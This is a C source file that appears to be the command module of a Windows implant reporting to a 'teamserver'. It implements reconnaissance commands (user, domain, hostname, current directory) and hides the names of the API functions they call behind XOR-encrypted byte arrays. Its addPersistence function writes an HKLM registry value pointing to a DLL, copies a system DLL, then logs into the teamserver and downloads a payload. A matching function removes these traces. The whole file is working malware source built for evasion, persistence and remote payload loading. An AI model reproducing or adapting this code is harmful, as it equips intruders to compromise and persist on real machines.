#include "command.h"

#define STATUS_SUCCESS          0x00000000
#define OBJ_CASE_INSENSITIVE    0x00000040L

// Function definitions
typedef BOOL ( WINAPI * GetUserNameA_t ) (
    LPSTR               lpBuffer,
    LPDWORD             pcbBuffer
);

typedef BOOL ( WINAPI * GetComputerNameExA_t ) (
    COMPUTER_NAME_FORMAT NameType,
    LPSTR                lpBuffer,
    LPDWORD              nSize
);

typedef DWORD ( WINAPI * GetCurrentDirectoryA_t ) (
    DWORD               nBufferLength,
    LPTSTR              lpBuffer
);

typedef VOID ( WINAPI * ExitProcess_t ) (
    UINT                uExitCode
);

typedef HANDLE ( WINAPI * CreateToolhelp32Snapshot_t ) (
    DWORD               dwFlags,
    DWORD               th32ProcessID
);

typedef BOOL ( WINAPI * Process32First_t ) (
    HANDLE              hSnapshot,
    LPPROCESSENTRY32    lppe
);

typedef BOOL ( WINAPI * Process32Next_t ) (
    HANDLE              hSnapshot,
    LPPROCESSENTRY32    lppe
);

typedef INT ( WINAPI * lstrcmpiA_t ) (
    LPCSTR              lpString1,
    LPCSTR              lpString2
);

// https://ntdoc.m417z.com/unicode_string
typedef struct _UNICODE_STRING
{
    USHORT  Length;
    USHORT  MaximumLength;
    PWCH    Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

// https://ntdoc.m417z.com/object_attributes
typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor; // PSECURITY_DESCRIPTOR;
    PVOID           SecurityQualityOfService; // PSECURITY_QUALITY_OF_SERVICE
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

// https://ntdoc.m417z.com/rtlinitunicodestring
FORCEINLINE VOID RtlInitUnicodeString(
    _Out_ PUNICODE_STRING DestinationString,
    _In_opt_z_ PCWSTR SourceString
    )
{
    if (SourceString)
        DestinationString->MaximumLength = (DestinationString->Length = (USHORT)(wcslen(SourceString) * sizeof(WCHAR))) + sizeof(UNICODE_NULL);
    else
        DestinationString->MaximumLength = DestinationString->Length = 0;

    DestinationString->Buffer = (PWCH)SourceString;
}

// https://ntdoc.m417z.com/initializeobjectattributes
#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// https://ntdoc.m417z.com/ntdeletefile
typedef NTSTATUS ( NTAPI * NtDeleteFile_t ) (
    POBJECT_ATTRIBUTES ObjectAttributes
);

// Custom "whoami" command
char * customWhoami( )
{
    static CHAR result[256];
    CHAR username[50];
    DWORD usernameSize = sizeof( username );
    CHAR domainName[50];
    DWORD domainSize = sizeof( domainName );

    char xorkey[]               = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]            = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sADVAPI32[]            = { 0x0, 0x6, 0x15, 0x5, 0x15, 0xf, 0x74, 0x3, 0x32 };
    char sGetUserNameA[]        = { 0x6, 0x27, 0x37, 0x11, 0x36, 0x23, 0x35, 0x7f, 0x53, 0x5e, 0x51, 0x0, 0x42 };
    char sGetComputerNameExA[]  = { 0x6, 0x27, 0x37, 0x7, 0x2a, 0x2b, 0x37, 0x44, 0x46, 0x56, 0x46, 0xf, 0x23, 0x2e, 0x21, 0x0, 0x3e, 0x6, 0x31 };

    XORDecrypt( (char *) sGetComputerNameExA, sizeof( sGetComputerNameExA ),  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,           sizeof( sKERNEL32 ),            (char *) xorkey, sizeof( xorkey ) );

    GetComputerNameExA_t pGetComputerNameExA = (GetComputerNameExA_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sGetComputerNameExA );
    
    // Retrieve a NetBIOS or DNS name associated with the local computer (here DNS)
    if ( !pGetComputerNameExA( ComputerNameDnsDomain, // DNS domain assigned to the local computer
                               domainName,            // Buffer that receives the domain name
                               &domainSize )          // Buffer's size
    ) {
        printf( "[-] GetComputerNameExA failed!\n" );
    }

    XORDecrypt( (char *) sGetUserNameA, sizeof( sGetUserNameA ),  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sADVAPI32,     sizeof( sADVAPI32 ),      (char *) xorkey, sizeof( xorkey ) );

    GetUserNameA_t pGetUserNameA = (GetUserNameA_t) GetProcAddress( GetModuleHandle( sADVAPI32 ), sGetUserNameA );

    // Retrieve the name of the user
    if ( !pGetUserNameA( username,       // Buffer where username will be stored
                         &usernameSize ) // Buffer's size
    ) {
        printf( "[-] GetUserNameA failed!\n" );
    }

    snprintf( result, sizeof(result), "Domain\\User: %s\\%s", domainName, username );

    return result;
}

// Custom "hostname" command
char * customHostname( )
{
    static CHAR result[256];
    CHAR netbios[256];
    CHAR fqdn[256];
    DWORD netbiosSize = sizeof( netbios );
    DWORD fqdnSize    = sizeof( fqdn );

    char xorkey[]              = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]           = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sGetComputerNameExA[] = { 0x6, 0x27, 0x37, 0x7, 0x2a, 0x2b, 0x37, 0x44, 0x46, 0x56, 0x46, 0xf, 0x23, 0x2e, 0x21, 0x0, 0x3e, 0x6, 0x31 };

    XORDecrypt( (char *) sGetComputerNameExA, sizeof( sGetComputerNameExA ),  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,           sizeof( sKERNEL32 ),            (char *) xorkey, sizeof( xorkey ) );

    GetComputerNameExA_t pGetComputerNameExA = (GetComputerNameExA_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sGetComputerNameExA );

    // Retrieve a NetBIOS name associated with the local computer
    if ( !pGetComputerNameExA( ComputerNamePhysicalNetBIOS,  // NetBIOS name of the local computer
                               netbios,                      // Buffer that receives the computer name
                               &netbiosSize )                // Size of the computer name's buffer
    ) {
        printf( "[-] GetComputerNameExA failed (NetBIOS)!\n" );
    }

    // Retrieve a DNS name associated with the local computer
    if ( !GetComputerNameExA( ComputerNamePhysicalDnsFullyQualified,  // Fully Qualified Domain Name of the computer
                               fqdn,                                   // Buffer that receives the FQDN
                               &fqdnSize )                             // Size of the FQDN's buffer
    ) {
        printf( "[-] GetComputerNameExA failed (FQDN)!\n" );
    }
    
    snprintf( result, sizeof(result), "NetBIOS name: %s, FQDN: %s", netbios, fqdn );

    return result;                
}

// Custom "pwd" command
char * customPwd( )
{
    static CHAR result[256];
    DWORD bufferLength = 256;
    CHAR directoryBuffer[bufferLength];

    char xorkey[]                = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]             = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sGetCurrentDirectoryA[] = { 0x6, 0x27, 0x37, 0x7, 0x30, 0x34, 0x35, 0x54, 0x5c, 0x47, 0x70, 0x28, 0x30, 0x26, 0x27, 0x31, 0x29, 0x35, 0x48, 0x73, 0x33 };

    XORDecrypt( (char *) sGetCurrentDirectoryA, sizeof( sGetCurrentDirectoryA ),  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,             sizeof( sKERNEL32 ),              (char *) xorkey, sizeof( xorkey ) );

    GetCurrentDirectoryA_t pGetCurrentDirectoryA = (GetCurrentDirectoryA_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sGetCurrentDirectoryA );

    // Retrieve current directory
    if ( !pGetCurrentDirectoryA( bufferLength,            // Length of the buffer for the current directory
                                 directoryBuffer )        // Buffer that receives the current directory
    ) {
        printf( "[-] GetCurrentDirectory failed!\n" );
    }

    snprintf( result, sizeof(result), "Current directory: %s", directoryBuffer );

    return result;
}

// Custom "exit" command
void customExit( )
{
    char xorkey[]       = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sKERNEL32[]    = { 0xa, 0x7, 0x11, 0xa, 0x0, 0xa, 0x74, 0x3, 0x1c, 0x77, 0x78, 0xd, 0x42 };
    char sExitProcess[] = { 0x4, 0x3a, 0x2a, 0x30, 0x15, 0x34, 0x28, 0x52, 0x57, 0x40, 0x47, 0x41 };

    XORDecrypt( (char *) sExitProcess, sizeof( sExitProcess ), (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sKERNEL32,    sizeof( sKERNEL32 ),    (char *) xorkey, sizeof( xorkey ) );
    
    ExitProcess_t pExitProcess = (ExitProcess_t) GetProcAddress( GetModuleHandle( sKERNEL32 ), sExitProcess );

    // End calling process
    pExitProcess( 0 );
}

// Add persistence
char * addPersistence( )
{
    HKEY hKey = NULL;
    static CHAR result[256];
    int res;

    char xorkey[]    = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sLogin[]    = { 0x6e, 0x2e, 0x2c, 0x23, 0x2c, 0x28, 0x47 };
    char sDownload[] = { 0x6e, 0x26, 0x2c, 0x33, 0x2b, 0x2a, 0x28, 0x50, 0x56, 0x33 };
    char sSubKey[]   = { 0x12, 0x1b, 0x10, 0x10, 0x0, 0xb, 0x1b, 0x72, 0x47, 0x41, 0x46, 0x24, 0x2c, 0x37, 0x7, 0x2a, 0x28, 0x33, 0x43, 0x5d, 0x5f, 0x67, 0x24, 0x36, 0x1f, 0x7, 0x2a, 0x28, 0x33, 0x43, 0x5d, 0x5f, 0x68, 0x11, 0x30, 0x2a, 0x2a, 0x31, 0x1a, 0xa, 0x5e, 0x5c, 0x5a, 0x40, 0x2e, 0x30, 0x30, 0x18, 0x1, 0x23, 0x21, 0x50, 0x47, 0x5f, 0x40, 0x41 };
    char sPortDll[]  = { 0x34, 0x31, 0x26, 0x36, 0x73, 0x72, 0x69, 0x55, 0x5e, 0x5f, 0xe, 0x31, 0x2d, 0x31, 0x30, 0x6b, 0x22, 0x2b, 0x5d, 0x8, 0x17, 0x70, 0x0, 0x16, 0x2, 0x44 };
    char sDriver[]   = { 0x5, 0x30, 0x2a, 0x32, 0x20, 0x34, 0x47 };
    char sUser32[]   = { 0x2, 0x78, 0x1f, 0x13, 0x2c, 0x28, 0x23, 0x5e, 0x45, 0x40, 0x68, 0x12, 0x3b, 0x30, 0x30, 0x20, 0x2b, 0x74, 0x3, 0x6e, 0x46, 0x47, 0x24, 0x30, 0x70, 0x76, 0x6b, 0x22, 0x2b, 0x5d, 0x32 }; 
    char sUser64[]   = { 0x2, 0x78, 0x1f, 0x13, 0x2c, 0x28, 0x23, 0x5e, 0x45, 0x40, 0x68, 0x12, 0x3b, 0x30, 0x30, 0x20, 0x2b, 0x74, 0x3, 0x6e, 0x46, 0x47, 0x24, 0x30, 0x75, 0x70, 0x6b, 0x22, 0x2b, 0x5d, 0x32 };

    size_t loginSize    = sizeof( sLogin );
    size_t downloadSize = sizeof( sDownload );
    size_t subkeySize   = sizeof( sSubKey );
    size_t portDllSize  = sizeof( sPortDll );
    size_t driverSize   = sizeof( sDriver );
    size_t user32Size   = sizeof( sUser32 );
    size_t user64Size   = sizeof( sUser64 );

    XORDecrypt( (char *) sLogin,    loginSize,    (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sDownload, downloadSize, (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sSubKey,   subkeySize,   (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sPortDll,  portDllSize,  (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sDriver,   driverSize,   (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sUser32,   user32Size,   (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sUser64,   user64Size,   (char *) xorkey, sizeof( xorkey ) );
    
    // Create the specified registry key with no values, otherwise just open it
    res = RegCreateKeyExA( HKEY_LOCAL_MACHINE,           // Information about local computer
                           sSubKey,                      // Name of subkey that is created
                           0,                            // Reserved, must be 0
                           NULL,                         // User-defined class type of key (can be ignored)
                           REG_OPTION_NON_VOLATILE,      // The information is preserved when the system is restarted
                           KEY_WRITE | KEY_QUERY_VALUE,  // Write and query values
                           NULL,                         // Optional security attributes
                           &hKey,                        // Handle that receives the created key
                           NULL                          // No disposition information is returned
    );

    if ( res == ERROR_SUCCESS ) {
        // Set the data and type of a specified value inder a registry key
        res = RegSetValueExA( hKey,                    // Handle to the open registry key
                              sDriver,                 // Name of the value to be set 
                              0,                       // Reserved, must be 0
                              REG_SZ,                  // Null-terminated string
                              (const BYTE *) sPortDll, // Data to be stored (name of the DLL)
                              portDllSize              // Size of previous parameter in bytes
        );

        if ( res == ERROR_SUCCESS ) {
            // Copy an existing file to a new file (C:\Windows\System32\user32.dll to C:\Windows\System32\user64.dll)
            res = CopyFile( sUser32,     // Name of existing file
                            sUser64,     // Name of new file
                            FALSE        // If the new file already exists, the function overwrites the existing file and succeeds
            );

            if ( res != 0 ) {
                // The copy is successful and the key has changed in the registry
                // Login to the teamserver and download the DLL
                post_login( sLogin, loginSize );

                download( sDownload, downloadSize );
            } else {
                printf( "[-] CopyFile failed!\n" );
            }
            
        } else {
            printf( "[-] RegSetValueExA failed!\n" );
        }

    } else {
        printf( "[-] RegCreateKeyExA failed!\n" );
    }

    snprintf( result, sizeof(result), "The registry key:value is: %s\\%s", sSubKey, sPortDll );

    return result;
}

// Remove persistence
char * delPersistence( )
{
    static            CHAR result[256];
    int               res;
    NTSTATUS          status;
    UNICODE_STRING    unicodePath;
    OBJECT_ATTRIBUTES object;

    char xorkey[]        = { 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x31, 0x32, 0x33, 0x34 };
    char sNTDLL[]        = { 0xf, 0x16, 0x7, 0x8, 0x9, 0x46 };
    char sNtDeleteFile[] = { 0xf, 0x36, 0x7, 0x21, 0x29, 0x23, 0x33, 0x54, 0x74, 0x5a, 0x58, 0x24, 0x42 };
    char sSubKey[]       = { 0x12, 0x1b, 0x10, 0x10, 0x0, 0xb, 0x1b, 0x72, 0x47, 0x41, 0x46, 0x24, 0x2c, 0x37, 0x7, 0x2a, 0x28, 0x33, 0x43, 0x5d, 0x5f, 0x67, 0x24, 0x36, 0x1f, 0x7, 0x2a, 0x28, 0x33, 0x43, 0x5d, 0x5f, 0x68, 0x11, 0x30, 0x2a, 0x2a, 0x31, 0x1a, 0xa, 0x5e, 0x5c, 0x5a, 0x40, 0x2e, 0x30, 0x30, 0x18, 0x1, 0x23, 0x21, 0x50, 0x47, 0x5f, 0x40, 0x41 };
    char sUser64[]       = { 0x1d, 0x7d, 0x7c, 0x18, 0x19, 0x5, 0x7d, 0x6d, 0x65, 0x5a, 0x5a, 0x25, 0x2d, 0x34, 0x37, 0x19, 0x15, 0x3e, 0x42, 0x46, 0x56, 0x59, 0x72, 0x70, 0x1f, 0x31, 0x36, 0x23, 0x35, 0x7, 0x6, 0x1d, 0x50, 0x2d, 0x2e, 0x43 };

    size_t subkeySize      = sizeof( sSubKey );
    size_t user64Size      = sizeof( sUser64 );
    size_t ntdllSize       = sizeof( sNTDLL );
    size_t deleteFileSize  = sizeof( sNtDeleteFile );

    XORDecrypt( (char *) sSubKey,       subkeySize,     (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sUser64,       user64Size,     (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sNTDLL,        ntdllSize,      (char *) xorkey, sizeof( xorkey ) );
    XORDecrypt( (char *) sNtDeleteFile, deleteFileSize, (char *) xorkey, sizeof( xorkey ) );

    HMODULE hNtdll = GetModuleHandle( sNTDLL );

    // Delete the C:\Windows\System32\user64.dll
    wchar_t * wideUser64 = convertCharArrayToLPCWSTR( sUser64 );
        
    // Initializes a counted Unicode string
    RtlInitUnicodeString( 
        &unicodePath,       // The buffer for a counted Unicode string to be initialized
        wideUser64          // Unicode string to initialize the counted string
    );
        
    // Initializes the OBJECT_ATTRIBUTES structure
    InitializeObjectAttributes( 
        &object,                // Pointer to the OBJECT_ATTRIBUTES structure
        &unicodePath,           // Pointer to the Unicode string
        OBJ_CASE_INSENSITIVE,   // A case-insensitive comparison is used when matching the ObjectName parameter against the names of existing objects
        NULL,                   // The ObjectName is a fully qualified object name, so RootDirectory is NULL
        NULL                    // Optional security descriptor
    );

    NtDeleteFile_t pNtDeleteFile = (NtDeleteFile_t) GetProcAddress( hNtdll, sNtDeleteFile );
    if ( pNtDeleteFile == NULL ) {
        printf( "[-] Error in NtDeleteFile pointer!\n" );
    }

    // Delete the specified file
    status = pNtDeleteFile( 
        &object     // Pointer to the OBJECT_ATTRIBUTES structure
    );

    if ( status == STATUS_SUCCESS ) {
        // Delete the subkey and its values
        res = RegDeleteKeyA( HKEY_LOCAL_MACHINE,  // Information about local computer like in addPersistence
                             sSubKey              // Name of subkey that was created
        );

        if ( res == ERROR_SUCCESS ) {
            snprintf( result, sizeof(result), "Successfully deleted the registry key and its value\n" );

        } else {
            printf( "[-] RegDeleteKeyA failed!\n" );
        }
    } else {
        printf( "[-] NtDeleteFile failed!\n" );
    }

    return result;
}